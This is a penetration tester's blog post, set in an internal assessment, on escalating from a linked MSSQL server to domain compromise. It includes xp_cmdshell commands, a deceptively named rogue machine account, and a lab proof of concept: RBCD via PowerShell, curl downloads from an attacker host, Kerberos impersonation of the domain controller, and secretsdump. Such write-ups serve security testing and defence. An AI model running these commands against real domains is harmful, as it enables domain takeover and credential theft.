---
layout: post
title: "No Hash, No Password, No Problem: Owning Active Directory via MSSQL and RBCD"
date: 2026-03-27
categories:
  - ActiveDirectory
tags:
  - ActiveDirectory
  - RBCD
  - Windows
  - MSSQL
keywords:
  - ""
  - ""
image: "/images/No_hash_No_Problem/banner.jpg"
author: "zerofrost"
draft: false
description: ""
difficulty: Medium
showFullContent: false
---


In a recent internal assessment, I gained access to a linked MSSQL server running with domain administrator privileges. The initial access vector involved exploiting an arbitrary file read vulnerability on a Windows server, which allowed reading of configuration files, one of which contained MSSQL credentials. This blog post will detail the steps, obstacles, and unexpected turns encountered while testing and understanding privilege escalation paths in a lab scenario.

### Background
The initially compromised MSSQL server was running as a low-privilege domain user, but after checking the linked servers, I came across another MSSQL server running with domain administrator privileges. Command execution was trivial using the `xp_cmdshell` function, which was initially disabled but could be enabled using the classic `sp_configure`.
```c
EXEC('sp_configure ''Show Advanced Options'', 1 RECONFIGURE;') AT "R3SQL1";
INFO(R3SQL1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

EXEC('sp_configure ''xp_cmdshell'', 1 RECONFIGURE;') AT "R3SQL1";
INFO(R3SQL1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.


EXEC('xp_cmdshell whoami;') AT "R3SQL1";
output     
--------   
REDACTED\ssql   
NULL   
```

My initial thought was since `ssql` is part of the domain administrators group, I could dump credentials on the host, obtain a clear text password/password hash, which I could later use for lateral movement/dumping domain hashes for pth/cracking. However, checking the processes running on the host, I noticed that there was an EDR running. I am not a malware development specialist, and I neither had the time nor the patience to bypass EDR, therefore, I chose to explore other promising avenues.

My second thought was, since since this was a pentest and not a red team engagement anyway, I could just create a domain account, add it to the Domain Admins group, dump hashes and call it a day. 
```c
xp_cmdshell net group "Domain Admins" /domain
xp_cmdshell net user "SQLPROD" "P@ssw0rd1337#" /add /domain
xp_cmdshell net user "SQLPROD" /domain
```
However, there was a problem.
```c
xp_cmdshell net group "Domain Admins" "SQLPROD" /add /domain
output     
--------   
Access is denied.  
NULL   
```


Our account was created successfully, but EDR seems to be blocking addition of suspicious users to privileged groups. Since our rogue account was created, the next thing I usually do is to add a machine account as a backup account. That way, in case it is detected and deleted, I still have a working domain machine account. This happens more often than you’d think: the created domain account is deleted, but the backup machine account is not, and this case was no exception. I usually like giving it a name that will make a SOC analyst think twice before deleting it.
```c
addcomputer.py 'REDACTED/SQLPROD':'P@ssw0rd1337#' -method LDAPS -computer-name 'R3SQL1-PROD$' -computer-pass 'P@ssw0rd1337#' -dc-ip 10.10.1.1
```





### Schtasks & Sc
Another idea I had was to write the commands in one file i.e commands to add our user to Local and Domain Admin Groups, then execute the script as a scheduled task using `schtasks` and as a service using `sc.exe`, but that didn't work either. At this point, I am starting to doubt this is a domain admin account. However, trying to access the domain controller works, indicating that the privileges are elevated.

```c
EXEC('xp_cmdshell ''dir \\DC.REDACTED.int\c$'' ;') AT "R3SQL1\REDACTEDSQL";
output                                                                                             
------------------------------------------------------------------------------------------------   
 Volume in drive \\DC.REDACTED.int\c$ has no label.                                           
 Volume Serial Number is E6B5-6E68                                                                 
NULL                                                                                               
 Directory of \\DC.REDACTED.int\c$                                                            
NULL                                                                                               
04/19/2023  09:52 PM    <DIR>          2023                                                        
03/11/2023  12:25 PM    <DIR>          Adplus                                                      
03/21/2023  04:12 PM    <DIR>          Cert                                                        
03/18/2026  06:45 PM    <DIR>          Cleanup                                                     
02/09/2023  12:38 PM    <DIR>          EXCH                                                        
03/09/2023  01:34 PM    <DIR>          ExchangeSetupLogs                                           
07/29/2023  10:47 AM    <DIR>          GPOReports                                                  
03/11/2023  08:25 PM    <DIR>          inetpub                                                     
04/11/2023  07:52 PM    <DIR>          PerfLogs                                                    
03/05/2026  11:18 PM    <DIR>          Program Files                                               
03/05/2026  11:19 PM    <DIR>          Program Files (x86)                                         
02/07/2023  04:09 PM    <DIR>          SQL2019                                                     
11/14/2025  03:53 PM    <DIR>          temp                                                        
03/26/2026  03:21 PM    <DIR>          Users                                                       
03/22/2026  09:49 AM    <DIR>          Windows                                                     
              23 File(s) 17,247,304,768 bytes                                                      
              23 Dir(s)  1,503,890,976,768 bytes free                 
```

### Winrs
These privileges also allow us to execute commands on the domain controller using `winrs.exe`
```c
EXEC('xp_cmdshell ''winrs -r:DC.REDACTED.int "hostname"'' ;') AT "R3SQL1";
output        
-----------   
DC   
NULL     


EXEC('xp_cmdshell ''winrs -r:DC.REDACTED.int "whoami /priv"'' ;') AT "R3SQL1";
output                                                                                                                 
--------------------------------------------------------------------------------------------------------------------   
PRIVILEGES INFORMATION                                                                                                 
----------------------                                                                                                   
Privilege Name                            Description                                                        State     
========================================= ================================================================== =======   
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled   
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled   
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled   
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled   
SeSystemProfilePrivilege                  Profile system performance                                         Enabled   
SeSystemtimePrivilege                     Change the system time                                             Enabled   
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled   
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled   
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled   
SeBackupPrivilege                         Back up files and directories                                      Enabled   
SeRestorePrivilege                        Restore files and directories                                      Enabled   
SeDebugPrivilege                          Debug programs                                                     Enabled   
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled   
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled   
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled   
SeUndockPrivilege                         Remove computer from docking station                               Enabled   
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled   
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled   
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled   
SeCreateGlobalPrivilege                   Create global objects                                              Enabled   
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled   
SeTimeZonePrivilege                       Change the time zone                                               Enabled   
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled   
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled   
NULL     
```

Trying to add our account to `Domain/Local Admins` group through `winrs` did not work either.


### Relay attacks
#### NTLM Relay
Another option would be to set up `ntlmrelayx` on our attacker machine, trigger an SMB connection as domain admin, then relay the connection to a domain-joined machine with SMB Signing disabled. From there we could dump SAM hashes. The environment had a lot of subnets full of Windows machines. This meant there was at least a chance that one of the Windows machines had SMB signing disabled… right? right?

Out of the more than 2,000 hosts in the environment, 0 had SMB signing disabled. Guess we are out of luck with that approach.

#### LDAP Relay
Another route is relaying SMB connections to LDAP using `ntlmrelayx`, which would allow us to create a machine account with similar permissions as the domain admin user `ssql`. However, for that to work, LDAP signing needs to be disabled, which was not the case.

We could also relay to MSSQL, but that would only lead us to where we already are, and would only be a good option for lateral movement.


Let's recap our current situation:
* We have an account with domain admin privileges.
* We don't have the account's password.
* We don't have the account's password hash.
* Relay attacks won't work because signing is enabled.



### Shadow Credentials
Since the domain admin has privileges to add/write/modify properties of other domain objects, we still have other avenues to explore. First we could go the shadow credential route and add a shadow credential to the domain controller machine account(`DC$`), then use it to conduct a DCSync attack. This can be achieved by modifying its `msDS-KeyCredentialLink` attribute.

Pre-requisites to abuse Shadow Credentials:
* Support for PKINIT and at least one DC with Windows Server 2016 or above
* Permission(`GenericWrite/GenericAll`) to modify the `msDS-KeyCredentialLink` attribute for the target object (which we have as domain admin).
* Key Trust enabled (via `msDS-KeyCredentialLink`)

### Resource Based Constrained Delegation
Another alternative would be to set up Resource Based Constrained Delegation. This attack involves modifying the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute which only requires a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object(DC$), which we have as domain admin. This allows a computer we control(`R3SQL1-PROD\$`) to impersonate other users i.e `DC\$`.

Why target the domain controller's machine account(`DC\$`)?
* The DC machine account already has access to all domain data because DCs are the source of authority for AD.
* Machine accounts like `DC$` are considered “system-level” and are less likely to trigger alerts because the DC needs to communicate and replicate constantly with other machines.
* Security tools and EDR are often tuned to detect suspicious activity by human users e.g an Administrator user dumping hashes for the whole domain.



Pre-requisites to abuse RBCD:
* Control a computer account, in our case `R3SQL1-PROD$`
* Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target `DC$`
* Target has SPN e.g `ldap/DC.REDACTED.int`








### POC
I chose to go with the latter approach here since I found it much simpler. Since I no longer have access to the environment to demonstrate the attack, I will use a local setup with the same prerequisites and minor changes.

* `ATTACKER$` will represent `R3SQL1-PROD$`
* `MARVEL.local` will represent `REDACTED.int`
* `MARVEL-DC$` will represent `DC$`
* `rsanchez` will represent compromised domain admin `ssql`
* `pparker` will represent a low priv domain account we added e.g `SQLPROD`


To modify the attributes, I decided to go with [ADModule](https://github.com/samratashok/ADModule) which is a Microsoft signed DLL for the Active Directory PowerShell module and works flawlessly from Powershell's Constrained Language Mode.

From the attacker machine, we need to copy the module to the target system. There are many ways to achieve this, but in this case, we can zip the module.
```c
 
zip -r file.zip ADModule-master/*
```

We can then prepare the script to modify the attributes. (May require some obfuscation)
```c
# Store in update.ps1
klist
echo '[*] Starting';
Import-Module C:\Users\Public\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\Users\Public\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
echo '[*] Loaded';

$comps ='ATTACKER$'
Set-ADComputer -Identity MARVEL-DC -PrincipalsAllowedToDelegateToAccount $comps
echo '[*] Done';

```

From the compromised sql server, download and extract the archive, then run the script.
```c
cd C:\Users\Public
curl 192.168.56.1:3030/file.zip -o file.zip
curl 192.168.56.1:3030/update.ps1 -o update.ps1
powershell Expand-Archive -Path file.zip -DestinationPath C:\Users\Public
powershell .\update.ps1
```

![](/images/No_hash_No_Problem/rbcd_klist.png)


Using any low priv domain account, we can confirm this from our kali attacker machine.
```c
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'MARVEL-DC$' -action 'read' 'marvel.local/pparker' -k -no-pass -dc-ip 192.168.56.103
```
![](/images/No_hash_No_Problem/rbcd_check_attrib.png)


Another way to confirm is to try and write again (even without privs) and you will get an error `can already impersonate users on the DC`
```c
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'MARVEL-DC$' -action 'write' 'marvel.local/pparker' -k -no-pass -dc-ip 192.168.56.103
```
![](/images/No_hash_No_Problem/rbcd_write_attrib.png)

First we can obtain a TGT for the attacker's machine account that we control
```c
impacket-getTGT  'MARVEL.local/ATTACKER$:P@ssw0rd1337#' -dc-ip 192.168.56.103;
cp 'ATTACKER$.ccache' /tmp/loot/ -v;

```

Next, using our attacker account (`marvel.local/ATTACKER$`), we can request a service ticket for the LDAP service (`ldap/MARVEL-DC.MARVEL.local`) and impersonate the domain controller(`MARVEL-DC$`) 
```c
export KRB5CCNAME="/tmp/loot/ATTACKER$.ccache";
getST.py -spn 'ldap/MARVEL-DC.MARVEL.local' -impersonate 'MARVEL-DC$' 'marvel.local/ATTACKER$' -k -no-pass  -dc-ip 192.168.56.103
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating MARVEL-DC$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in MARVEL-DC$@ldap_MARVEL-DC.MARVEL.local@MARVEL.LOCAL.ccache
```
![](/images/No_hash_No_Problem/rbcd_getspn.png)


> We request an ticket for the LDAP service since we want to DCSync 


We can rename the generated ticket and give it the right permissions.
```c
# Rename the file
mv 'MARVEL-DC$@ldap_MARVEL-DC.MARVEL.local@MARVEL.LOCAL.ccache' /tmp/loot/dc.cacche -v
renamed 'MARVEL-DC$@ldap_MARVEL-DC.MARVEL.local@MARVEL.LOCAL.ccache' -> '/tmp/loot/dc.cacche'


# Set the variable, give perms and confirm
export KRB5CCNAME='/tmp/loot/dc.cacche'
chmod 600 '/tmp/loot/dc.cacche'                                    
klist 
Credentials cache: FILE:/tmp/loot/dc.cacche
Principal: MARVEL-DC$@marvel.local
  Issued                Expires               Principal
Mar 27 16:41:05 2026  Mar 28 02:36:02 2026  ldap/MARVEL-DC.MARVEL.local@MARVEL.LOCAL

```
![](/images/No_hash_No_Problem/rbcd_set_dc_ticket.png)

>  In some cases, `klist` mandates the permission of the `.ccache` file to be `600` for it to work


Finally, we can dump hashes using the ticket
```c
secretsdump.py 'MARVEL.local/MARVEL-DC$'@MARVEL-DC.MARVEL.local  -k -no-pass
```
![](/images/No_hash_No_Problem/rbcd_dump_hashes.png)

